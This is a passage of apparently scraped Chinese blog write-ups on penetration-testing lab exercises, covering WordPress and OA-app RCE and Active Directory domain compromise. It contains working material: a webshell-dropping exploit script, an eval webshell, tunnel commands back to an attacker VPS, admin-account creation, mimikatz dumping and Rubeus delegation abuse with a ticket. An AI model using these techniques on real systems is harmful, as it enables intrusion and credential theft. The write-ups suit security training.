状态码:404 长度:315    标题:Not Found</span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] NetBios 172.22.2.34     XIAORANG\CLIENT01             </span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.2.34</span><br><span class="line">主机名: CLIENT01</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.2.34</span><br><span class="line">[2025-03-04 21:18:18] [INFO] 系统信息 172.22.2.3 [Windows Server 2016 Datacenter 14393]</span><br><span class="line">[2025-03-04 21:18:18] [INFO] 系统信息 172.22.2.16 [Windows Server 2016 Datacenter 14393]</span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] NetBios 172.22.2.3      DC:DC.xiaorang.lab               Windows Server 2016 Datacenter 14393</span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.2.3</span><br><span class="line">主机名: DC</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.2.3</span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] NetBios 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server 2016 Datacenter 14393</span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] 匿名登录成功!</span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] NetBios 172.22.2.18     WORKGROUP\UBUNTU-WEB02        </span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] 172.22.2.34 CVE-2020-0796 SmbGhost Vulnerable</span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] SMB认证成功 172.22.2.18:445 administrator:123456</span><br><span class="line">[2025-03-04 21:18:18] [INFO] SMB2共享信息 172.22.2.18:445 administrator Pass:123456 共享:[print$ IPC$]</span><br><span class="line">[2025-03-04 21:18:18] [SUCCESS] 网站标题 http://172.22.2.18        状态码:200 长度:57738  标题:又一个WordPress站点</span><br><span class="line">[2025-03-04 21:18:20] [INFO] SMB2共享信息 172.22.2.16:445 admin Pass:123456 共享:[ADMIN$ C$ fileshare IPC$]</span><br><span class="line">[2025-03-04 21:18:26] [SUCCESS] SMB认证成功 172.22.2.16:445 admin:123456</span><br></pre></td></tr></table></figure><p>stowaway代理搭建</p><p>vps：</p><p>.&#x2F;linux_x64_admin –heartbeat -l 61032 -s aab32</p><p>在被控端（shell机器）启动：</p><p>.&#x2F;linux_x64_agent -c &lt;VPS IP地址&gt;:61032 -s aab32</p><p>建立连接后，在服务端选中上线的节点，并且执行socks命令即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use 0</span><br><span class="line"># socks 端口 用户名 密码</span><br><span class="line">socks 55667 username password</span><br></pre></td></tr></table></figure><p>此时使用 <code>socks5://username:password@&lt;VPS IP&gt;:55667</code> 就可以代理到被控端的内网了。</p><p>尝试使用账号密码时不能用，去掉账号密码可以</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741096508666-f46f4c5b-86bd-424a-bc0b-cd9899fff26f.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains wpscan --url http://172.22.2.18</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741096634000-4fd163b4-8589-414f-8d61-65e3c2cb8e77.png"></p><p>在网上查到相关rce文章，并且给了利用脚本</p><p><a href="https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a/">https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import binascii</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"># This is a magic string that when treated as pixels and compressed using the png</span><br><span class="line"># algorithm, will cause &lt;?=$_GET[1]($_POST[2]);?&gt; to be written to the png file</span><br><span class="line">payload = &#x27;2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50&#x27;</span><br><span class="line"></span><br><span class="line">def encode_character_code(c: int):</span><br><span class="line">    return &#x27;&#123;:08b&#125;&#x27;.format(c).replace(&#x27;0&#x27;, &#x27;x&#x27;)</span><br><span class="line"></span><br><span class="line">text = &#x27;&#x27;.join([encode_character_code(c) for c in binascii.unhexlify(payload)])[1:]</span><br><span class="line"></span><br><span class="line">destination_url = &#x27;http://172.22.2.18/&#x27;</span><br><span class="line">cmd = &#x27;ls&#x27;</span><br><span class="line"></span><br><span class="line"># With 1/11 scale, &#x27;1&#x27;s will be encoded as single white pixels, &#x27;x&#x27;s as single black pixels.</span><br><span class="line"></span><br><span class="line">requests.get(</span><br><span class="line">    f&quot;&#123;destination_url&#125;wp-content/plugins/wpcargo/includes/barcode.php?text=&#123;text&#125;&amp;sizefactor=.090909090909&amp;size=1&amp;filepath=/var/www/html/webshell.php&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># We have uploaded a webshell - now let&#x27;s use it to execute a command.</span><br><span class="line"></span><br><span class="line">print(requests.post(</span><br><span class="line">    f&quot;&#123;destination_url&#125;webshell.php?1=system&quot;, data=&#123;&quot;2&quot;: cmd&#125;</span><br><span class="line">).content.decode(&#x27;ascii&#x27;, &#x27;ignore&#x27;))</span><br></pre></td></tr></table></figure><p>一把梭哈</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741097242152-432e24ac-96c4-427c-91ac-19c1404bed23.png"></p><p>连接蚁剑</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741097468462-65f4738c-3b1f-4fea-9197-0bb62f215ffd.png"></p><p>注意到config文件，查看，得到数据库用户，密码。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741097535093-d8020696-cb8e-4efb-925e-7ac856d333e1.png"></p><p>看到数据库密码</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741097611345-626c0295-5559-4f33-a7a4-7ea3a73c8fae.png"></p><p>连一下</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741097825364-0c40cb50-178a-4601-b5c9-957d0ffd7379.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741097848512-32f63a9b-b19f-4fa1-a61e-e642a10b52ff.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741097893511-d550b24f-bebb-405f-8861-ca75914eb4cb.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741097949837-bd1dc40d-912a-49a6-beb0-1c8dbec6fb9a.png"></p><h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><p>发现了一个密码表，导出</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741098031228-51623acd-b968-4fdb-8a75-c28e064032b1.png"></p><p>再回到之前的fscan扫描结果，还有1433端口开放去爆破，用那个密码爆破172.22.2.16:1433。</p><p>fscan -h 172.22.2.16 -m mssql -pwdf 1.txt [+] mssql:172.22.2.16:1433:sa ElGNkOiC</p><p>这里环境出了点问题使用pwncat,收到shell之后会进入到pwncat终端模式这时候想要回到shell模式只需输入back</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741099289493-89c305d8-7d31-407a-9897-46ccdaba099c.png"></p><p>上mdut</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741099687174-ae3aa826-ea72-41f6-b05e-3f0117b68a75.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741099672431-f77c0d4c-4dcc-4fe0-bb9a-bc1b7e8c8cb9.png"></p><p>Sweetpotato提权</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741173053940-52a8cf16-e934-49b0-9071-498948ab5472.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/Public/SweetPotato-Webshell-new.exe -a &quot;net user test qwer1234! /add&quot;</span><br><span class="line">C:/Users/Public/SweetPotato-Webshell-new.exe -a &quot;net localgroup administrators test /add&quot;</span><br></pre></td></tr></table></figure><p>rdp上去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741173674191-1d0d56f3-d525-42b3-b4dd-993d7bea54bf.png"></p><p>在用户位置翻到flag<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741173741629-bc01e5f5-32a8-4973-810c-8d982b9d2bc3.png"></p><h2 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h2><p>发现在域内，上传猕猴桃抓取hash，管理员运行</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741173940219-360b1c9b-55da-48b7-b6ee-790d66abcb6b.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741174493844-66ff867c-1d95-4e26-8e0b-d25c5328698b.png"></p><p>这里用Adinfo（<a href="https://github.com/lzzbb/Adinfo/releases">https://github.com/lzzbb/Adinfo/releases</a>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Adinfo_win.exe -d xiaorang.lab --dc 172.22.2.3 -u MSSQLSERVER$ -H 26c5767767ddac88dfccd8449fc11502</span><br></pre></td></tr></table></figure><p>发现约束委派</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741175206994-aca6b607-39e0-49f8-a5dd-8bfaae57ae49.png">MSSQLSERVER 配置了到域控的约束委派, 可以通过 S4U 伪造高权限 ST 拿下域控，用Rubeus申请访问自身的服务票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:26c5767767ddac88dfccd8449fc11502 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741176177798-4ad88854-8e4f-43eb-b2f3-89b27c855ed1.png"></p><p>之后注入票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE35FWG/jPPvxUw/lHeSjZgWtlqb2wYxA+JK8guQVinSocTPiJxmyzJx4QmWVBa2kXo0gizhWCEYNjrSdWhMJ5I8vzw+e8Bft3i5m5svPbcyImYWhDlg7Mvysh0fAekboYFgUWklHkA0OvwPyd9pA8K9e9mNzq2SyxHmkNxWtmX0tgPAZXnowM3DKT9Uewdl0zfHeqCfRqGErml+IxkQmgyllrnxluhlDcU+yjETECmnUX2AUGd9DivoCw2Nk6iTRlc09pCYtU2gVjrte4knoZRw8cmpn5bPnYzXkMBdedYngf0ihW0xo+kKh6XzWuTC1Q4EtTWHQmr/oWzuNfmh0ldOJVx0BarDogz8NCmYIo81zGp9XUYjeajFOC3qRsLGsMwQg0m0CdoX24dRS5haMtTbNVsXt+y1Fk2Q0bykJPN1/U2vol0i2jVGPXJcDsrz5JmFOAWswAQ1pjz/FoPh6/be/0MY2p5tJwmXc7BTSeDLvJAcK5YnbeQZ9KNlLIEB3oECXjdkIq992blr6Nn0+ReEHWQkCreUPjHgTLu69qURQrzOruUZlrV+LusdGptZVg/HCP74aKleqTBp35sT/zyCL+GgqkFq0FLelQxebb8lbbreysa1GG8IivGROl2bqb4w9AqDuoCQTXa87F22nQ24d9ZL1U5STQWKL5d5T0TivwXyRqGNHcveSJfYN17fiwTVhxb5og/F17BLClvid+zDmXe4iZ6oyXgefSXAv35WekdhrywWm3DED3qd7V5WBo1Zd5JRojuZbg0+thmC/gCJcQtoU8xpiIqP/2fKA2NlKQYf5BjhXlbOri/Yq+TRRZVQQUgQS58dYfi9hLNgE5nzlnfmCY49uXCe3WbzoNFVPconnjRJUh9PP+QOk+0l2mLsUKeaQaFldlB8PbAh7nhPPJVycjOACBMNDFUr90VF9WgHnijxvFDkp3XHktauL4EaInkxPg7QSsk0pVCowVrdRRwkPyPVW38/3MwA5/j7Jg7yeice+gV3UcrvRbRChb1fJZcyHcC4BSo9U+iKJtBs1Zcm3DqTQVas4f9qc9eKtQJze+icr+lbMsQwJYk9ZUSOTBueg8eVWGnSwMACaMAjUjkUYYyh36oZMRPb24zr4weUIxGsixxUbLdtnszq8givNuxCXX2ES53L72XxkKuGULblnqL0Yf5O7Hwr2fIkbwRJjnweAd7c/IcT/4uyhnp8VhabIgv9N5UdlTgfCyGyfZVxEhxxPd88ma/QNXsiicnHX/QQ0g8AYLA3175X/n/pBNZZkALWo7PoSc/BB+Xbq3gSrDgMpxaywGu9Gnz/Q1vyk9txVO6WN7x7ivu+3s/z17CwRkjF0LNzoZ4/+JUwQSXesdKTcCdLC0fNodwl0HF2Dkv4nCwvaPh+Xac0i/TpXMQJho6dyphE19l6hXJTTaLolWYQEgkIKgDQlFuCdTKXPkygJxv/G5ED3dGjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBBlCcnhKBNudgBbGrCE1V9ZoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI1MDMwNTEyMDIyMVqmERgPMjAyNTAzMDUyMjAyMjFapxEYDzIwMjUwMzEyMTIwMjIxWqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==</span><br></pre></td></tr></table></figure><p>之后再访问域控里面的flag文件</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741176338122-b4118e59-c198-46e9-8e3b-0f562523f580.png"></p><p>参考：<a href="https://forum.butian.net/share/1591">https://forum.butian.net/share/1591</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云境-Initial</title>
      <link href="/2024/12/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/"/>
      <url>/2024/12/08/%E5%9F%9F%E6%B8%97%E9%80%8F/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/</url>
      
        <content type="html"><![CDATA[<h2 id="tp漏洞rce"><a href="#tp漏洞rce" class="headerlink" title="tp漏洞rce"></a>tp漏洞rce</h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741234482347-cdd9bc09-4cd0-4df2-bc3f-2311a57be31e.png"></p><p>上蚁剑</p><p>find &#x2F; -user root -perm -4000 -print 2&gt; result.txt</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741234587677-742f1d77-c0b4-42e9-9ba8-1f01915eba7d.png"></p><p>suid提权没有，尝试sudo</p><p>发现mysql命令</p><p>提权命令</p><p><a href="https://www.huangmj.com/17116743651246.html#36-sudo-mysql">https://www.huangmj.com/17116743651246.html#36-sudo-mysql</a></p><p>查看文件名带flag的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql -e &#x27;\! find / -type f -name &#x27;*flag*&#x27; 2&gt;/dev/null&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741234708830-8a13ee63-03ba-4500-a518-1abc1f94953a.png"></p><p>读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql -e &#x27;\! cat /root/flag/flag01.txt&#x27;</span><br></pre></td></tr></table></figure><p>提示下一个在内网中，</p><p>vps起个服务，wget下个fscan扫一下</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741235072247-9d0b560e-1bcb-45ae-9c8f-e81d4a13fd38.png"><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741235032844-2b3ef0e7-afc6-4712-b280-9f9f1ade5c55.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741235174837-6446d7ac-8daf-414f-b707-c11c420284c6.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">[2025-03-06 12:25:54] [INFO] 暴力破解线程数: 1</span><br><span class="line">[2025-03-06 12:25:54] [INFO] 开始信息扫描</span><br><span class="line">[2025-03-06 12:25:54] [INFO] CIDR范围: 172.22.1.0-172.22.1.255</span><br><span class="line">[2025-03-06 12:25:54] [INFO] 生成IP范围: 172.22.1.0.%!d(string=172.22.1.255) - %!s(MISSING).%!d(MISSING)</span><br><span class="line">[2025-03-06 12:25:54] [INFO] 解析CIDR 172.22.1.15/24 -&gt; IP范围 172.22.1.0-172.22.1.255</span><br><span class="line">[2025-03-06 12:25:54] [INFO] 最终有效主机数量: 256</span><br><span class="line">[2025-03-06 12:25:54] [INFO] 开始主机扫描</span><br><span class="line">[2025-03-06 12:25:54] [INFO] 正在尝试无监听ICMP探测...</span><br><span class="line">[2025-03-06 12:25:54] [INFO] 当前用户权限不足,无法发送ICMP包</span><br><span class="line">[2025-03-06 12:25:54] [INFO] 切换为PING方式探测...</span><br><span class="line">[2025-03-06 12:25:54] [SUCCESS] 目标 172.22.1.15     存活 (ICMP)</span><br><span class="line">[2025-03-06 12:25:54] [SUCCESS] 目标 172.22.1.18     存活 (ICMP)</span><br><span class="line">[2025-03-06 12:25:54] [SUCCESS] 目标 172.22.1.2      存活 (ICMP)</span><br><span class="line">[2025-03-06 12:25:54] [SUCCESS] 目标 172.22.1.21     存活 (ICMP)</span><br><span class="line">[2025-03-06 12:26:00] [INFO] 存活主机数量: 4</span><br><span class="line">[2025-03-06 12:26:00] [INFO] 有效端口数量: 233</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] 端口开放 172.22.1.2:88</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] 端口开放 172.22.1.18:80</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] 端口开放 172.22.1.15:80</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] 端口开放 172.22.1.15:22</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] 端口开放 172.22.1.21:445</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] 端口开放 172.22.1.2:445</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] 端口开放 172.22.1.18:445</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] 端口开放 172.22.1.2:389</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] 端口开放 172.22.1.21:139</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] 端口开放 172.22.1.2:139</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] 端口开放 172.22.1.18:139</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] 端口开放 172.22.1.21:135</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] 端口开放 172.22.1.2:135</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] 端口开放 172.22.1.18:135</span><br><span class="line">[2025-03-06 12:26:00] [SUCCESS] 端口开放 172.22.1.18:3306</span><br><span class="line">[2025-03-06 12:26:01] [SUCCESS] 服务识别 172.22.1.15:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]</span><br><span class="line">[2025-03-06 12:26:01] [SUCCESS] 服务识别 172.22.1.18:3306 =&gt; [mysql] 产品:MySQL 信息:unauthorized Banner:[D.j Host &#x27;172.22.1.15&#x27; is not allowed to connect to this MySQL server]</span><br><span class="line">[2025-03-06 12:26:05] [SUCCESS] 服务识别 172.22.1.2:88 =&gt; </span><br><span class="line">[2025-03-06 12:26:05] [SUCCESS] 服务识别 172.22.1.18:80 =&gt; [http]</span><br><span class="line">[2025-03-06 12:26:06] [SUCCESS] 服务识别 172.22.1.21:445 =&gt; </span><br><span class="line">[2025-03-06 12:26:06] [SUCCESS] 服务识别 172.22.1.2:445 =&gt; </span><br><span class="line">[2025-03-06 12:26:06] [SUCCESS] 服务识别 172.22.1.18:445 =&gt; </span><br><span class="line">[2025-03-06 12:26:06] [SUCCESS] 服务识别 172.22.1.2:389 =&gt; [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name</span><br><span class="line">[2025-03-06 12:26:06] [SUCCESS] 服务识别 172.22.1.21:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-03-06 12:26:06] [SUCCESS] 服务识别 172.22.1.2:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-03-06 12:26:06] [SUCCESS] 服务识别 172.22.1.15:80 =&gt; [http]</span><br><span class="line">[2025-03-06 12:26:06] [SUCCESS] 服务识别 172.22.1.18:139 =&gt;  Banner:[.]</span><br></pre></td></tr></table></figure><p>看到1.18的80端口开放，搭个socks代理</p><p>stowaway代理搭建<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741236043329-96883d9a-829b-4821-bc7a-e026e62572fe.png"></p><p>vps：</p><p>.&#x2F;linux_x64_admin –heartbeat -l 61032 -s aab32</p><p>在被控端（shell机器）启动：</p><p>.&#x2F;linux_x64_agent -c &lt;VPS IP地址&gt;:61032 -s aab32</p><p>建立连接后，在服务端选中上线的节点，并且执行socks命令即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use 0</span><br><span class="line"># socks 端口 用户名 密码</span><br><span class="line">socks 55667 username password</span><br></pre></td></tr></table></figure><p>此时使用 <code>socks5://username:password@&lt;VPS IP&gt;:55667</code> 就可以代理到被控端的内网了。</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741235555816-d9470307-455e-44bf-9cd7-85863d8e6ff5.png"></p><p>kali配置好socks代理后，创建poc目录，脚本同目录放一个1.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure><p>poc.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">url_pre = &#x27;http://172.22.1.18/&#x27;</span><br><span class="line">url1 = url_pre + &#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span><br><span class="line">url2 = url_pre + &#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span><br><span class="line">url3 = url_pre + &#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span><br><span class="line"></span><br><span class="line">data1 = &#123;</span><br><span class="line">    &#x27;rempass&#x27;: &#x27;0&#x27;,</span><br><span class="line">    &#x27;jmpass&#x27;: &#x27;false&#x27;,</span><br><span class="line">    &#x27;device&#x27;: &#x27;1625884034525&#x27;,</span><br><span class="line">    &#x27;ltype&#x27;: &#x27;0&#x27;,</span><br><span class="line">    &#x27;adminuser&#x27;: &#x27;YWRtaW4=&#x27;,</span><br><span class="line">    &#x27;adminpass&#x27;: &#x27;YWRtaW4xMjM=&#x27;,</span><br><span class="line">    &#x27;yanzm&#x27;: &#x27;&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = session.post(url1, data=data1)</span><br><span class="line">r = session.post(url2, files=&#123;&#x27;file&#x27;: open(&#x27;1.php&#x27;, &#x27;r+&#x27;)&#125;)</span><br><span class="line"></span><br><span class="line">filepath = str(r.json()[&#x27;filepath&#x27;])</span><br><span class="line">filepath = &quot;/&quot; + filepath.split(&#x27;.uptemp&#x27;)[0] + &#x27;.php&#x27;</span><br><span class="line">id = r.json()[&#x27;id&#x27;]</span><br><span class="line">print(id)</span><br><span class="line">print(filepath)</span><br><span class="line">url3 = url_pre + f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=&#123;id&#125;&#x27;</span><br><span class="line"></span><br><span class="line">r = session.get(url3)</span><br><span class="line">r = session.get(url_pre + filepath + &quot;?1=system(&#x27;dir&#x27;);&quot;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>然后运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 poc.py </span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741235759771-7fc947e0-fe10-42b6-8d06-5153b5b3dc15.png"></p><p>打印出来的就马</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741235856262-1a3ad930-13d1-48b8-a5fc-d8d95001f68a.png"></p><p>上蚁剑，记得配置代理</p><p>管理员目录下找到flag</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1741235938760-398edb79-bab7-40b2-b777-f56cf7e2590d.png"></p><h2 id="永恒之蓝"><a href="#永恒之蓝" class="headerlink" title="永恒之蓝"></a>永恒之蓝</h2><p>这边fscan高版本有点问题，换个低版本的</p><p><img 